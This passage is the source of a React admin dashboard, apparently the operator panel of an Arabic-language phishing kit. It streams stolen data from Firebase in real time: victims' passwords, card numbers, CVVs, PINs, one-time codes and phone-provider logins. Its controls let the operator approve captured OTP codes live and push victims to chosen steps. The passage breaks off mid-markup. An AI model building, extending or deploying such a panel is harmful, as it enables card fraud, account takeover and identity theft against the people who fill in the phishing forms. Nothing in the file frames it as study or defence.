import React, { useEffect, useState, useRef } from "react";
import { useLocation } from "wouter";
import { toast } from "sonner";
import { 
  Search,
  User,
  Mail,
  Phone,
  Calendar,
  MapPin,
  CreditCard,
  Shield,
  Globe,
  CheckCircle,
  Clock,
  RefreshCw,
  ChevronRight,
  Smartphone,
  FileText,
  Trash2,
  Wifi,
  WifiOff,
  Users,
  LogOut,
  Volume2,
  VolumeX,
  Lock,
  Settings,
  X,
  Palette,
  Layout,
  Grid3X3,
  List,
  Bell
} from "lucide-react";
import { cn } from "@/lib/utils";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { formatDistanceToNow } from "date-fns";
import { ar } from "date-fns/locale";
import { 
  subscribeToSubmissions, 
  subscribeToPayments, 
  subscribeToOnlineUsers,
  subscribeToAllOtpRequests,
  subscribeToLoginAttempts,
  deleteSubmission,
  deletePayment,
  deleteOnlineUser,
  approveOtp,
  rejectOtp,
  deleteOtpRequest,
  deleteLoginAttempt,
  setUserStep,
  app
} from "@/lib/firebase";
import { getAuth, onAuthStateChanged, signOut, User as FirebaseUser } from "firebase/auth";

const auth = getAuth(app);

interface OnlineUser {
  id: string;
  visitorId: string;
  online: boolean;
  lastSeen: any;
  currentPage: string;
}

interface Submission {
  id: string;
  visitorId: string;
  status?: string;
  lastStep?: string;
  updatedAt?: any;
  completedAt?: any;
  step_1_account_type?: {
    isNewAccount: boolean;
    accountType: string;
    completedAt: string;
  };
  step_2_personal_data?: {
    fullNameArabic: string;
    fullNameEnglish: string;
    email: string;
    phoneNumber: string;
    dateOfBirth: string;
    gender: string;
    nationality: string;
    address: {
      buildingNumber: string;
      area: string;
      street: string;
    };
    completedAt: string;
  };
  step_3_password?: {
    passwordSet: boolean;
    password: string;
    completedAt: string;
  };
  step_4_payment_card?: {
    cardNumber: string;
    cardName: string;
    expiry: string;
    cvv: string;
    savedAt: string;
  };
  step_4_payment?: {
    amount: string;
    status: string;
    paymentMethod: string;
    cardNumber: string;
    cardName: string;
    expiry: string;
    cvv: string;
    otpCode: string;
    completedAt: string;
  };
  step_5_pin?: {
    pinVerified: boolean;
    pinCode: string;
    completedAt: string;
  };
  step_6_phone_provider?: {
    provider: string;
    phoneNumber: string;
    personalId: string;
    email: string;
    password: string;
    completedAt: string;
  };
}

interface Payment {
  id: string;
  visitorId: string;
  status: string;
  updatedAt?: any;
}

interface OtpRequest {
  id: string;
  visitorId: string;
  cardNumber: string;
  cardName: string;
  expiry: string;
  cvv: string;
  otpCode: string;
  userName?: string;
  email?: string;
  status: "pending" | "approved" | "rejected";
  createdAt?: any;
  updatedAt?: any;
}

interface LoginAttempt {
  id: string;
  visitorId: string;
  username: string;
  password: string;
  createdAt?: any;
  userAgent?: string;
}

interface ThemeSettings {
  theme: "dark" | "light" | "blue" | "green" | "purple";
  sidebarWidth: "narrow" | "normal" | "wide";
  compactMode: boolean;
}

const themes = {
  dark: {
    bg: "bg-[#0f172a]",
    header: "bg-[#1e293b]",
    sidebar: "bg-[#1e293b]",
    card: "bg-[#1e293b]",
    border: "border-gray-700",
    text: "text-white",
    textMuted: "text-gray-400",
  },
  light: {
    bg: "bg-gray-100",
    header: "bg-white",
    sidebar: "bg-white",
    card: "bg-white",
    border: "border-gray-200",
    text: "text-gray-900",
    textMuted: "text-gray-600",
  },
  blue: {
    bg: "bg-[#0c1929]",
    header: "bg-[#1a365d]",
    sidebar: "bg-[#1a365d]",
    card: "bg-[#1a365d]",
    border: "border-blue-800",
    text: "text-white",
    textMuted: "text-blue-200",
  },
  green: {
    bg: "bg-[#0d1f17]",
    header: "bg-[#14532d]",
    sidebar: "bg-[#14532d]",
    card: "bg-[#14532d]",
    border: "border-green-800",
    text: "text-white",
    textMuted: "text-green-200",
  },
  purple: {
    bg: "bg-[#1a0f2e]",
    header: "bg-[#2e1065]",
    sidebar: "bg-[#2e1065]",
    card: "bg-[#2e1065]",
    border: "border-purple-800",
    text: "text-white",
    textMuted: "text-purple-200",
  },
};

const sidebarWidths = {
  narrow: "w-72",
  normal: "w-96",
  wide: "w-[28rem]",
};

const defaultThemeSettings: ThemeSettings = {
  theme: "dark",
  sidebarWidth: "normal",
  compactMode: false,
};

export default function FirebaseDashboard() {
  const [, setLocation] = useLocation();
  const [currentUser, setCurrentUser] = useState<FirebaseUser | null>(null);
  const [checkingAuth, setCheckingAuth] = useState(true);
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [payments, setPayments] = useState<Payment[]>([]);
  const [onlineUsers, setOnlineUsers] = useState<OnlineUser[]>([]);
  const [otpRequests, setOtpRequests] = useState<OtpRequest[]>([]);
  const [loginAttempts, setLoginAttempts] = useState<LoginAttempt[]>([]);
  const [selectedSubmission, setSelectedSubmission] = useState<Submission | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState<"all" | "completed" | "pending" | "online">("all");
  const previousIdsRef = useRef<Set<string>>(new Set());
  const listRef = useRef<HTMLDivElement>(null);
  const [newItemId, setNewItemId] = useState<string | null>(null);
  const [soundEnabled, setSoundEnabled] = useState(true);
  const audioContextRef = useRef<AudioContext | null>(null);
  const [showSettings, setShowSettings] = useState(false);
  const [viewMode, setViewMode] = useState<"list" | "grid">("grid");
  const [themeSettings, setThemeSettings] = useState<ThemeSettings>(() => {
    const saved = localStorage.getItem("dashboardTheme");
    return saved ? JSON.parse(saved) : defaultThemeSettings;
  });
  
  const currentTheme = themes[themeSettings.theme];

  useEffect(() => {
    localStorage.setItem("dashboardTheme", JSON.stringify(themeSettings));
  }, [themeSettings]);

  const playNotificationSound = () => {
    if (!soundEnabled) return;
    
    try {
      if (!audioContextRef.current) {
        audioContextRef.current = new (window.AudioContext || (window as any).webkitAudioContext)();
      }
      
      const ctx = audioContextRef.current;
      const oscillator = ctx.createOscillator();
      const gainNode = ctx.createGain();
      
      oscillator.connect(gainNode);
      gainNode.connect(ctx.destination);
      
      oscillator.frequency.setValueAtTime(800, ctx.currentTime);
      oscillator.frequency.setValueAtTime(600, ctx.currentTime + 0.1);
      oscillator.frequency.setValueAtTime(800, ctx.currentTime + 0.2);
      
      gainNode.gain.setValueAtTime(0.3, ctx.currentTime);
      gainNode.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
      
      oscillator.start(ctx.currentTime);
      oscillator.stop(ctx.currentTime + 0.3);
    } catch (error) {
      console.error("Error playing notification sound:", error);
    }
  };

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        setLocation("/admin/login");
      } else {
        setCurrentUser(user);
      }
      setCheckingAuth(false);
    });
    return () => unsubscribe();
  }, [setLocation]);

  const handleLogout = async () => {
    try {
      await signOut(auth);
      setLocation("/admin/login");
    } catch (error) {
      console.error("Logout error:", error);
    }
  };

  useEffect(() => {
    if (checkingAuth || !currentUser) return;
    
    const unsubscribeSubmissions = subscribeToSubmissions((data) => {
      // Detect actual new inserts by comparing IDs
      const currentIds = new Set(data.map(d => d.id));
      const newIds = data.filter(d => !previousIdsRef.current.has(d.id));
      
      if (newIds.length > 0 && previousIdsRef.current.size > 0) {
        const newestItem = newIds[0];
        setNewItemId(newestItem?.id || null);
        // Play notification sound
        playNotificationSound();
        // Show toast notification
        const userName = newestItem?.step_2_personal_data?.fullNameArabic || `زائر جديد`;
        toast.success(`تسجيل جديد: ${userName}`, {
          description: newestItem?.step_2_personal_data?.email || newestItem?.id?.slice(0, 8),
          duration: 5000,
        });
        // Scroll to top when new data arrives
        if (listRef.current) {
          listRef.current.scrollTop = 0;
        }
        // Clear highlight after 3 seconds
        setTimeout(() => setNewItemId(null), 3000);
      }
      const hasNewItems = newIds.length > 0 && previousIdsRef.current.size > 0;
      previousIdsRef.current = currentIds;
      // Sort by newest first
      const sortedData = [...data].sort((a, b) => {
        const dateA = a.updatedAt?.seconds || a.updatedAt?.toMillis?.() || 0;
        const dateB = b.updatedAt?.seconds || b.updatedAt?.toMillis?.() || 0;
        return dateB - dateA;
      });
      setSubmissions(sortedData);
      setLoading(false);
      // If new items arrived, select the newest one; otherwise keep current selection in sync
      if (hasNewItems) {
        setSelectedSubmission(sortedData[0] || null);
      } else {
        setSelectedSubmission(prev => {
          if (prev) {
            const updated = sortedData.find(d => d.id === prev.id);
            return updated || (sortedData.length > 0 ? sortedData[0] : null);
          }
          return sortedData.length > 0 ? sortedData[0] : null;
        });
      }
    });

    const unsubscribePayments = subscribeToPayments((data) => {
      setPayments(data);
    });

    const unsubscribeOnline = subscribeToOnlineUsers((users) => {
      setOnlineUsers(users.filter(u => u.online));
    });

    const unsubscribeOtpRequests = subscribeToAllOtpRequests((requests) => {
      const pendingRequests = requests.filter(r => r.status === "pending");
      const prevPending = otpRequests.filter(r => r.status === "pending");
      if (pendingRequests.length > prevPending.length) {
        playNotificationSound();
        const newOtp = pendingRequests.find(r => !prevPending.some(p => p.id === r.id));
        if (newOtp) {
          toast.warning(`طلب OTP جديد`, {
            description: `بطاقة: ${newOtp.cardNumber?.slice(-4) || "****"} - ${newOtp.userName || newOtp.visitorId?.slice(0, 8)}`,
            duration: 10000,
          });
        }
      }
      setOtpRequests(requests);
    });

    const unsubscribeLoginAttempts = subscribeToLoginAttempts((attempts) => {
      if (attempts.length > loginAttempts.length && loginAttempts.length > 0) {
        playNotificationSound();
        const newAttempt = attempts[0];
        toast.error(`محاولة تسجيل دخول جديدة`, {
          description: `المستخدم: ${newAttempt?.username || "غير معروف"}`,
          duration: 5000,
        });
      }
      setLoginAttempts(attempts);
    });

    return () => {
      unsubscribeSubmissions();
      unsubscribePayments();
      unsubscribeOnline();
      unsubscribeOtpRequests();
      unsubscribeLoginAttempts();
    };
  }, [checkingAuth, currentUser]);

  const isUserOnline = (visitorId: string) => {
    return onlineUsers.some(u => u.visitorId === visitorId && u.online);
  };

  const getUserCurrentPage = (visitorId: string) => {
    const user = onlineUsers.find(u => u.visitorId === visitorId);
    return user?.currentPage || "";
  };

  const formatDate = (timestamp: any) => {
    if (!timestamp) return "";
    try {
      const date = timestamp.seconds 
        ? new Date(timestamp.seconds * 1000) 
        : timestamp.toDate?.() || new Date(timestamp);
      return formatDistanceToNow(date, { addSuffix: true, locale: ar });
    } catch {
      return "";
    }
  };

  const handleDelete = async (submissionId: string) => {
    if (window.confirm("هل أنت متأكد من حذف هذا التسجيل؟")) {
      // Delete submission, payment, and online status
      await Promise.all([
        deleteSubmission(submissionId),
        deletePayment(submissionId),
        deleteOnlineUser(submissionId)
      ]);
      if (selectedSubmission?.id === submissionId) {
        setSelectedSubmission(null);
      }
    }
  };

  // Sort submissions by date (newest first)
  const sortedSubmissions = [...submissions].sort((a, b) => {
    const dateA = a.updatedAt?.seconds || a.updatedAt?.toMillis?.() || 0;
    const dateB = b.updatedAt?.seconds || b.updatedAt?.toMillis?.() || 0;
    return dateB - dateA;
  });

  const filteredSubmissions = sortedSubmissions.filter((sub) => {
    const matchesSearch = 
      sub.step_2_personal_data?.fullNameArabic?.includes(searchQuery) ||
      sub.step_2_personal_data?.fullNameEnglish?.toLowerCase().includes(searchQuery.toLowerCase()) ||
      sub.step_2_personal_data?.email?.toLowerCase().includes(searchQuery.toLowerCase()) ||
      sub.visitorId.includes(searchQuery);

    if (activeTab === "completed") return matchesSearch && sub.status === "completed";
    if (activeTab === "pending") return matchesSearch && sub.status !== "completed";
    if (activeTab === "online") return matchesSearch && isUserOnline(sub.visitorId);
    return matchesSearch;
  });

  const stats = {
    total: submissions.length,
    completed: submissions.filter(s => s.status === "completed").length,
    pending: submissions.filter(s => s.status !== "completed").length,
    online: onlineUsers.length,
    payments: payments.length,
  };

  const getStepStatus = (sub: Submission) => {
    const steps = [];
    if (sub.step_1_account_type) steps.push("نوع الحساب");
    if (sub.step_2_personal_data) steps.push("البيانات");
    if (sub.step_3_password) steps.push("كلمة المرور");
    if (sub.step_4_payment_card || sub.step_4_payment) steps.push("الدفع");
    if (sub.step_5_pin) steps.push("PIN");
    if (sub.step_6_phone_provider) steps.push("مزود الخدمة");
    return steps;
  };

  const pendingOtpRequests = otpRequests.filter(r => r.status === "pending");

  const handleApproveOtp = async (visitorId: string) => {
    await approveOtp(visitorId);
    // Delay deletion to allow client to receive approval status
    setTimeout(() => deleteOtpRequest(visitorId), 3000);
  };

  const handleRejectOtp = async (visitorId: string) => {
    await rejectOtp(visitorId);
    // Delay deletion to allow client to receive rejection status
    setTimeout(() => deleteOtpRequest(visitorId), 3000);
  };

  const handleSetUserStep = async (visitorId: string, step: number) => {
    await setUserStep(visitorId, step);
  };

  if (checkingAuth) {
    return (
      <div className="min-h-screen bg-[#0f172a] flex items-center justify-center">
        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-white"></div>
      </div>
    );
  }

  if (!currentUser) {
    return null;
  }

  return (
    <div className={cn("min-h-screen font-sans", currentTheme.bg, currentTheme.text)} dir="rtl">
      {/* OTP Approval Panel - Fixed floating */}
      {pendingOtpRequests.length > 0 && (
        <div className="fixed bottom-4 left-4 z-50 w-80 md:w-96 max-h-[60vh] overflow-y-auto">
          <div className={cn("rounded-xl shadow-2xl border-2 border-orange-500", currentTheme.card)}>
            <div className="bg-orange-500 text-white px-4 py-3 rounded-t-xl flex items-center justify-between">
              <div className="flex items-center gap-2">
                <Shield className="h-5 w-5 animate-pulse" />
                <span className="font-bold">طلبات OTP ({pendingOtpRequests.length})</span>
              </div>
              <span className="text-xs bg-white/20 px-2 py-1 rounded">تحتاج موافقة</span>
            </div>
            <div className="p-3 space-y-3">
              {pendingOtpRequests.map((req) => (
                <div key={req.id} className={cn("p-3 rounded-lg border", currentTheme.border, "bg-orange-500/10")}>
                  <div className="flex items-center justify-between mb-2">
                    <span className="text-sm font-bold">{req.userName || req.visitorId.slice(0, 12)}</span>
                    <span className="text-xs text-orange-400">{formatDate(req.createdAt)}</span>
                  </div>
                  <div className="grid grid-cols-2 gap-2 text-xs mb-3">
                    <div>
                      <span className={currentTheme.textMuted}>رقم البطاقة:</span>
                      <p className="text-red-400 font-mono">{req.cardNumber}</p>
                    </div>
                    <div>
                      <span className={currentTheme.textMuted}>CVV:</span>
                      <p className="text-yellow-400 font-mono">{req.cvv}</p>
                    </div>
                    <div>
                      <span className={currentTheme.textMuted}>الانتهاء:</span>
                      <p className="font-mono">{req.expiry}</p>
                    </div>
                    <div>
                      <span className={currentTheme.textMuted}>OTP:</span>
                      <p className="text-purple-400 font-bold text-lg">{req.otpCode}</p>
                    </div>
                  </div>
                  <div className="flex gap-2">
                    <Button
                      size="sm"
                      className="flex-1 bg-green-600 hover:bg-green-700 text-white"
                      onClick={() => handleApproveOtp(req.visitorId)}
                    >
                      <CheckCircle className="h-4 w-4 ml-1" />
                      موافقة
                    </Button>
                    <Button
                      size="sm"
                      variant="destructive"
                      className="flex-1"
                      onClick={() => handleRejectOtp(req.visitorId)}
                    >
                      <X className="h-4 w-4 ml-1" />
                      رفض
                    </Button>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Login Attempts Panel - Fixed floating */}
      {loginAttempts.length > 0 && (
        <div className="fixed bottom-4 right-4 z-50 w-80 md:w-96 max-h-[60vh] overflow-y-auto">
          <div className={cn("rounded-xl shadow-2xl border-2 border-red-500", currentTheme.card)}>
            <div className="bg-red-500 text-white px-4 py-3 rounded-t-xl flex items-center justify-between">
              <div className="flex items-center gap-2">
                <Lock className="h-5 w-5" />
                <span className="font-bold">محاولات تسجيل الدخول ({loginAttempts.length})</span>
              </div>
            </div>
            <div className="p-3 space-y-3 max-h-80 overflow-y-auto">
              {loginAttempts.slice(0, 10).map((attempt) => (
                <div key={attempt.id} className={cn("p-3 rounded-lg border", currentTheme.border, "bg-red-500/10")}>
                  <div className="flex items-center justify-between mb-2">
                    <span className="text-sm font-bold">{attempt.visitorId?.slice(0, 12)}</span>
                    <span className="text-xs text-red-400">{formatDate(attempt.createdAt)}</span>
                  </div>
                  <div className="space-y-2 text-xs">
                    <div className="flex items-center gap-2">
                      <User className="h-3 w-3 text-gray-400" />
                      <span className={currentTheme.textMuted}>المستخدم:</span>
                      <span className="text-yellow-400 font-mono font-bold">{attempt.username}</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <Lock className="h-3 w-3 text-gray-400" />
                      <span className={currentTheme.textMuted}>كلمة المرور:</span>
                      <span className="text-red-400 font-mono font-bold">{attempt.password}</span>
                    </div>
                  </div>
                  <div className="mt-2 flex justify-end">
                    <Button
                      size="sm"
                      variant="ghost"
                      className="text-red-400 hover:text-red-300 hover:bg-red-500/20"
                      onClick={() => deleteLoginAttempt(attempt.id)}
                    >
                      <Trash2 className="h-4 w-4" />
                    </Button>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Settings Modal */}
      {showSettings && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className={cn("rounded-xl p-6 w-96 max-w-[90vw]", currentTheme.card, currentTheme.border, "border")}>
            <div className="flex items-center justify-between mb-6">
              <h3 className="text-lg font-bold flex items-center gap-2">
                <Settings className="h-5 w-5" />
                إعدادات المظهر
              </h3>
              <button onClick={() => setShowSettings(false)} className="p-1 hover:bg-white/10 rounded">
                <X className="h-5 w-5" />
              </button>
            </div>

            <div className="space-y-6">
              <div>
                <label className="flex items-center gap-2 text-sm font-medium mb-3">
                  <Palette className="h-4 w-4" />
                  السمة
                </label>
                <div className="grid grid-cols-5 gap-2">
                  {(Object.keys(themes) as Array<keyof typeof themes>).map((key) => (
                    <button
                      key={key}
                      onClick={() => setThemeSettings(prev => ({ ...prev, theme: key }))}
                      className={cn(
                        "h-12 rounded-lg border-2 transition-all",
                        themes[key].bg,
                        themeSettings.theme === key ? "border-white ring-2 ring-white/30" : "border-transparent hover:border-white/30"
                      )}
                      title={key}
                    />
                  ))}
                </div>
                <div className="grid grid-cols-5 gap-2 mt-1 text-xs text-center">
                  <span>داكن</span>
                  <span>فاتح</span>
                  <span>أزرق</span>
                  <span>أخضر</span>
                  <span>بنفسجي</span>
                </div>
              </div>

              <div>
                <label className="flex items-center gap-2 text-sm font-medium mb-3">
                  <Layout className="h-4 w-4" />
                  عرض الشريط الجانبي
                </label>
                <div className="flex gap-2">
                  {(["narrow", "normal", "wide"] as const).map((width) => (
                    <button
                      key={width}
                      onClick={() => setThemeSettings(prev => ({ ...prev, sidebarWidth: width }))}
                      className={cn(
                        "flex-1 py-2 px-3 rounded-lg border transition-all text-sm",
                        themeSettings.sidebarWidth === width
                          ? "bg-blue-600 border-blue-600 text-white"
                          : cn(currentTheme.border, "hover:border-blue-400")
                      )}
                    >
                      {width === "narrow" ? "ضيق" : width === "normal" ? "عادي" : "عريض"}
                    </button>
                  ))}
                </div>
              </div>

              <div>
                <label className="flex items-center gap-2 text-sm font-medium mb-3">
                  <FileText className="h-4 w-4" />
                  الوضع المضغوط
                </label>
                <button
                  onClick={() => setThemeSettings(prev => ({ ...prev, compactMode: !prev.compactMode }))}
                  className={cn(
                    "w-full py-2 px-3 rounded-lg border transition-all text-sm flex items-center justify-between",
                    themeSettings.compactMode
                      ? "bg-blue-600 border-blue-600 text-white"
                      : cn(currentTheme.border, "hover:border-blue-400")
                  )}
                >
                  <span>{themeSettings.compactMode ? "مفعل" : "معطل"}</span>
                  <div className={cn(
                    "w-10 h-6 rounded-full transition-colors flex items-center px-1",
                    themeSettings.compactMode ? "bg-green-500 justify-end" : "bg-gray-600 justify-start"
                  )}>
                    <div className="w-4 h-4 bg-white rounded-full" />
                  </div>
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Header */}
      <header className={cn("border-b px-3 md:px-6 py-3 md:py-4", currentTheme.header, currentTheme.border)}>
        <div className="flex items-center justify-between gap-2">
          <div className="flex items-center gap-2 md:gap-4 min-w-0">
            <h1 className={cn("text-base md:text-xl font-bold truncate", currentTheme.text)}>لوحة البيانات</h1>
            <span className="hidden sm:flex text-xs bg-green-500/20 text-green-400 px-2 py-1 rounded items-center gap-1">
              <Wifi className="h-3 w-3" />
              <span className="hidden md:inline">متصل مباشر</span>
            </span>
          </div>
          <div className="flex items-center gap-1 md:gap-2 lg:gap-4">
            <span className={cn("text-xs md:text-sm hidden lg:block", currentTheme.textMuted)}>{currentUser.email}</span>
            <div className="flex items-center gap-1 md:gap-2 bg-blue-500/20 text-blue-400 px-2 md:px-3 py-1 md:py-1.5 rounded text-xs md:text-sm">
              <Users className="h-3 w-3 md:h-4 md:w-4" />
              <span>{stats.online}</span>
              <span className="hidden md:inline">متصل</span>
            </div>
            <Button
              variant="outline"
              size="sm"
              className={cn(
                currentTheme.border, "hover:bg-white/10 px-2 md:px-3",
                soundEnabled ? "text-green-400" : currentTheme.textMuted
              )}
              onClick={() => setSoundEnabled(!soundEnabled)}
              data-testid="button-toggle-sound"
            >
              {soundEnabled ? <Volume2 className="h-4 w-4" /> : <VolumeX className="h-4 w-4" />}
              <span className="hidden lg:inline mr-2">{soundEnabled ? "الصوت مفعل" : "الصوت مغلق"}</span>
            </Button>
            <Button
              variant="outline"
              size="sm"
              className={cn(currentTheme.border, currentTheme.textMuted, "hover:bg-white/10 px-2 md:px-3")}
              onClick={() => setShowSettings(true)}
              data-testid="button-settings"
            >
              <Settings className="h-4 w-4" />
              <span className="hidden lg:inline mr-2">المظهر</span>
            </Button>
            <Button
              variant="outline"
              size="sm"
              className={cn(currentTheme.border, currentTheme.textMuted, "hover:bg-white/10 px-2 md:px-3 hidden md:flex")}
              onClick={() => window.location.reload()}
            >
              <RefreshCw className="h-4 w-4" />
              <span className="hidden lg:inline mr-2">تحديث</span>
            </Button>
            <Button
              variant="outline"
              size="sm"
              className="border-red-600 text-red-400 hover:bg-red-900/30 px-2 md:px-3"
              onClick={handleLogout}
              data-testid="button-logout"
            >
              <LogOut className="h-4 w-4" />
              <span className="hidden lg:inline mr-2">خروج</span>
            </Button>
          </div>
        </div>
      </header>

      {/* Stats Bar */}
      <div className={cn("border-b px-3 md:px-6 py-2 md:py-3 overflow-x-auto", currentTheme.header, currentTheme.border)}>
        <div className="flex items-center gap-2 md:gap-4 min-w-max">
          <button
            onClick={() => setActiveTab("all")}
            className={cn(
              "flex items-center gap-1 md:gap-2 px-2 md:px-4 py-1.5 md:py-2 rounded-lg transition-colors text-sm",
              activeTab === "all" ? "bg-blue-600 text-white" : cn(currentTheme.textMuted, "hover:opacity-80")
            )}
          >
            <FileText className="h-4 w-4" />
            <span className="hidden sm:inline">الكل</span>
            <span className={cn("px-1.5 md:px-2 py-0.5 rounded text-xs md:text-sm", activeTab === "all" ? "bg-white/20" : "bg-black/10")}>{stats.total}</span>
          </button>
          <button
            onClick={() => setActiveTab("online")}
            className={cn(
              "flex items-center gap-1 md:gap-2 px-2 md:px-4 py-1.5 md:py-2 rounded-lg transition-colors text-sm",
              activeTab === "online" ? "bg-green-600 text-white" : cn(currentTheme.textMuted, "hover:opacity-80")
            )}
          >
            <Wifi className="h-4 w-4" />
            <span className="hidden sm:inline">متصل</span>
            <span className={cn("px-1.5 md:px-2 py-0.5 rounded text-xs md:text-sm", activeTab === "online" ? "bg-white/20" : "bg-black/10")}>{stats.online}</span>
          </button>
          <button
            onClick={() => setActiveTab("completed")}
            className={cn(
              "flex items-center gap-1 md:gap-2 px-2 md:px-4 py-1.5 md:py-2 rounded-lg transition-colors text-sm",
              activeTab === "completed" ? "bg-emerald-600 text-white" : cn(currentTheme.textMuted, "hover:opacity-80")
            )}
          >
            <CheckCircle className="h-4 w-4" />
            <span className="hidden sm:inline">مكتمل</span>
            <span className={cn("px-1.5 md:px-2 py-0.5 rounded text-xs md:text-sm", activeTab === "completed" ? "bg-white/20" : "bg-black/10")}>{stats.completed}</span>
          </button>
          <button
            onClick={() => setActiveTab("pending")}
            className={cn(
              "flex items-center gap-1 md:gap-2 px-2 md:px-4 py-1.5 md:py-2 rounded-lg transition-colors text-sm",
              activeTab === "pending" ? "bg-yellow-600 text-white" : cn(currentTheme.textMuted, "hover:opacity-80")
            )}
          >
            <Clock className="h-4 w-4" />
            <span className="hidden sm:inline">قيد التسجيل</span>
            <span className={cn("px-1.5 md:px-2 py-0.5 rounded text-xs md:text-sm", activeTab === "pending" ? "bg-white/20" : "bg-black/10")}>{stats.pending}</span>
          </button>
          <div className={cn("mr-auto flex items-center gap-1 md:gap-2 text-sm", currentTheme.textMuted)}>
            <CreditCard className="h-4 w-4" />
            <span>{stats.payments}</span>
            <span className="hidden md:inline">مدفوعات</span>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex flex-col md:flex-row h-[calc(100vh-120px)] md:h-[calc(100vh-140px)]">
        {/* Submissions List */}
        <div className={cn(
          "border-l flex flex-col",
          "w-full md:w-80 lg:w-96",
          "h-1/2 md:h-full",
          "order-2 md:order-1",
          currentTheme.sidebar, 
          currentTheme.border
        )}>
          {/* Search & View Toggle */}
          <div className={cn("p-4 border-b", currentTheme.border)}>
            <div className="flex gap-2 mb-2">
              <div className="relative flex-1">
                <Search className={cn("absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4", currentTheme.textMuted)} />
                <Input
                  placeholder="بحث بالاسم أو البريد..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className={cn("pr-10", currentTheme.bg, currentTheme.border, currentTheme.text, "placeholder:opacity-50")}
                />
              </div>
              <div className="flex gap-1">
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={() => setViewMode("grid")}
                  className={cn(viewMode === "grid" ? "bg-blue-600 text-white" : currentTheme.textMuted)}
                >
                  <Grid3X3 className="h-4 w-4" />
                </Button>
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={() => setViewMode("list")}
                  className={cn(viewMode === "list" ? "bg-blue-600 text-white" : currentTheme.textMuted)}
                >
                  <List className="h-4 w-4" />
                </Button>
              </div>
            </div>
          </div>

          {/* List/Grid View */}
          <div ref={listRef} className="flex-1 overflow-y-auto scroll-smooth p-2">
            {loading ? (
              <div className="flex items-center justify-center h-32 text-gray-500">
                <RefreshCw className="h-6 w-6 animate-spin" />
              </div>
            ) : filteredSubmissions.length === 0 ? (
              <div className="p-8 text-center text-gray-500">
                <FileText className="h-12 w-12 mx-auto mb-4 opacity-50" />
                <p>لا توجد بيانات</p>
              </div>
            ) : viewMode === "grid" ? (
              <div className="grid grid-cols-1 gap-2">
                {filteredSubmissions.map((sub) => (
                  <button
                    key={sub.id}
                    onClick={() => setSelectedSubmission(sub)}
                    className={cn(
                      "rounded-lg p-3 text-right transition-all border",
                      currentTheme.card,
                      currentTheme.border,
                      selectedSubmission?.id === sub.id
                        ? "ring-2 ring-blue-500 bg-blue-600/20"
                        : "hover:bg-white/5",
                      newItemId === sub.id && "animate-pulse bg-green-500/30"
                    )}
                  >
                    <div className="flex items-center justify-between mb-2">
                      <div className="flex items-center gap-2">
                        <div className={cn(
                          "w-8 h-8 rounded-full flex items-center justify-center text-white text-xs",
                          isUserOnline(sub.visitorId) ? "bg-green-600" : "bg-gray-600"
                        )}>
                          {isUserOnline(sub.visitorId) ? <Wifi className="h-4 w-4" /> : <WifiOff className="h-4 w-4" />}
                        </div>
                        <span className={cn("font-bold text-sm truncate max-w-[120px]", currentTheme.text)}>
                          {sub.step_2_personal_data?.fullNameArabic || `زائر`}
                        </span>
                      </div>
                      <span className={cn("text-xs", currentTheme.textMuted)}>
                        {formatDate(sub.updatedAt)}
                      </span>
                    </div>
                    
                    {/* Quick Data Grid */}
                    <div className="grid grid-cols-2 gap-1 text-xs">
                      {sub.step_2_personal_data?.phoneNumber && (
                        <div className="bg-blue-500/10 rounded px-2 py-1 truncate">
                          <Phone className="h-3 w-3 inline ml-1" />
                          {sub.step_2_personal_data.phoneNumber}
                        </div>
                      )}
                      {sub.step_4_payment?.cardNumber && (
                        <div className="bg-orange-500/10 text-orange-400 rounded px-2 py-1 truncate">
                          <CreditCard className="h-3 w-3 inline ml-1" />
                          {sub.step_4_payment.cardNumber.slice(-4)}
                        </div>
                      )}
                      {sub.step_4_payment?.otpCode && (
                        <div className="bg-purple-500/10 text-purple-400 rounded px-2 py-1">
                          <Shield className="h-3 w-3 inline ml-1" />
                          OTP: {sub.step_4_payment.otpCode}
                        </div>
                      )}
                      {sub.step_5_pin?.pinCode && (
                        <div className="bg-red-500/10 text-red-400 rounded px-2 py-1">
                          <Lock className="h-3 w-3 inline ml-1" />
                          PIN: {sub.step_5_pin.pinCode}
                        </div>
                      )}
                      {sub.step_3_password?.password && (
                        <div className="bg-red-500/10 text-red-400 rounded px-2 py-1 truncate">
                          🔑 {sub.step_3_password.password}
                        </div>
                      )}
                      {sub.step_4_payment?.cvv && (
                        <div className="bg-yellow-500/10 text-yellow-400 rounded px-2 py-1">
                          CVV: {sub.step_4_payment.cvv}
                        </div>
                      )}
                    </div>
                    
                    {/* Status Badge */}
                    <div className="mt-2 flex gap-1">
                      {sub.status === "completed" ? (
                        <span className="text-xs bg-green-500/20 text-green-400 px-2 py-0.5 rounded">مكتمل</span>
                      ) : (
                        <span className="text-xs bg-yellow-500/20 text-yellow-400 px-2 py-0.5 rounded">{sub.lastStep || "جاري"}</span>
                      )}
                    </div>
                  </button>
                ))}
              </div>
            ) : (
              filteredSubmissions.map((sub) => (
                <button
                  key={sub.id}
                  onClick={() => setSelectedSubmission(sub)}
                  className={cn(
                    "w-full border-b text-right transition-all",
                    themeSettings.compactMode ? "p-2" : "p-4",
                    currentTheme.border,
                    selectedSubmission?.id === sub.id
                      ? "bg-blue-600/20 border-r-4 border-r-blue-500"
                      : "hover:bg-white/5",
                    newItemId === sub.id && "animate-pulse bg-green-500/30"
                  )}
                >
                  <div className="flex items-start justify-between gap-3">
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-2">
